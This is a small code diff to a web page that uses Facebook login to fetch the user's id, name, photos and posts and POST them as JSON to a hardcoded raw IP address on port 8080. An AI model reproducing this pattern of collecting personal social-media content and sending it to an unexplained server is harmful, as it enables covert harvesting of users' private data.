@@ -1,9 +1,9 @@
 <html>
 
 <script
-  src="https://code.jquery.com/jquery-3.1.1.min.js"
-  integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="
-  crossorigin="anonymous"></script>
+src="https://code.jquery.com/jquery-3.1.1.min.js"
+integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="
+crossorigin="anonymous"></script>
 
 <script>
 	window.fbAsyncInit = function() {
@@ -34,11 +34,17 @@ function myFacebookLogin() {
 			'GET',
 			{"fields":"id,name,photos,posts"},
 			function(response) {
-				$.post('23.92.21.203:8080',response);
-				}
+				$.ajax({
+					url: '23.92.21.203:8080',
+					type: 'POST',
+					contentType:'application/json',
+					data: JSON.stringify(response),
+					dataType:'json'
+				});
+			}
 
-				
-			});
+
+		});
 
 	}, {scope: 'user_photos, user_posts'});
 }
